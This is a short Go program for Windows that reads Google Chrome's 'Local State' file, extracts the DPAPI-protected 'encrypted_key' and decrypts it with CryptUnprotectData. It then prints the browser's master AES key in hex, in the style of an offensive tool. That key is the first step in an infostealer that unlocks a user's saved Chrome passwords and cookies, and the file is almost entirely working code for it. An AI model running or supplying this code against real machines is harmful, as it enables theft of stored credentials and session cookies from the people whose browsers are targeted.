package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

type LocalState struct {
	OsCrypt struct {
		EncryptedKey string `json:"encrypted_key"`
	} `json:"os_crypt"`
}

func decryptDPAPI(encrypted []byte) ([]byte, error) {
	var outBlob windows.DataBlob
	var inBlob windows.DataBlob

	inBlob.Size = uint32(len(encrypted))
	if len(encrypted) > 0 {
		inBlob.Data = &encrypted[0]
	}

	err := windows.CryptUnprotectData(
		&inBlob,
		nil,
		nil,
		0,
		nil,
		0,
		&outBlob,
	)
	if err != nil {
		return nil, fmt.Errorf("CryptUnprotectData failed: %v", err)
	}
	defer windows.LocalFree(windows.Handle(unsafe.Pointer(outBlob.Data)))

	decrypted := make([]byte, outBlob.Size)
	copy(decrypted, unsafe.Slice(outBlob.Data, outBlob.Size))
	return decrypted, nil
}

func getDecryptedKey() ([]byte, error) {
	localAppData := os.Getenv("LOCALAPPDATA")
	localStatePath := filepath.Join(localAppData, "Google", "Chrome", "User Data", "Local State")

	localStateData, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read Local State: %v", err)
	}

	var state LocalState
	err = json.Unmarshal(localStateData, &state)
	if err != nil {
		return nil, fmt.Errorf("failed to parse JSON: %v", err)
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode base64 key: %v", err)
	}

	if !strings.HasPrefix(string(encryptedKey), "DPAPI") {
		return nil, fmt.Errorf("unexpected key format")
	}
	encryptedKey = encryptedKey[5:]

	return decryptDPAPI(encryptedKey)
}

func main() {
	key, err := getDecryptedKey()
	if err != nil {
		fmt.Println("[-] Error:", err)
		return
	}

	fmt.Println("[+] Decrypted AES Key (hex):", fmt.Sprintf("%x", key))
}
